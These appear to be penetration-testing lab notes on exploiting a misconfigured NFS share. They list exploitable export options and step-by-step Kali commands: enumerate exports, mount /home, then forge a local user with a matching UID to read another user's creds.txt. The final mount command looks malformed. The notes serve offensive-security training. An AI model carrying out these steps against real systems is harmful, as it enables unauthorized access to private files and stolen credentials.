#### Exploitable Settings 
|**Option**|**Description**|
|---|---|
|`rw`|Read and write permissions.|
|`insecure`|Ports above 1024 will be used.|
|`nohide`|If another file system was mounted below an exported directory, this directory is exported by its own exports entry.|
|`no_root_squash`|All files created by root are kept with the UID/GID 0.|


```bash - kali
showmount -e $TARGET
```
`Export list for 10.11.1.72:`
`/home 10.11.0.0/255.255.0.0`

Notice the /home directory
```bash - kali
mkdir ./home
```
```bash - kali
sudo mount -t nfs -o nolock,nfsvers=3 $TARGET:/home ./home/
```
```bash - kali
cd ./home  && ls
```
If you are not able to `cat` the content due to permisions, open  a new terminal as `root` to read the content.

ExportFS
```bash - kali
echo '/mnt/nfs  $TARGET(sync,no_subtree_check)' >> /etc/exports
```

Digging through, we see Marcus folder has a creds file:
`-rwx------ 1 1014 1014 48 Oct 27 2019 creds.txt`
Now we create a new user on kali, change it's user id value, then open the file:
```bash - kali
sudo adduser pwn
```
```bash - kali
cat /etc/passwd | grep pwn
```
now to change the 1002 to 1014
```bash - kali
sudo sed -i -e 's/1002/1014/g' /etc/passwd
```
```bash - kali
cat /etc/passwd | grep pwn
```
```bash - kali
su pwn
```
```bash - kali
cat creds.txt
```
---
```bash - kali
mount -t nfs $TARGET:/Mount/ /MyFolder -no lock
```
```
cd /MyFolder
```
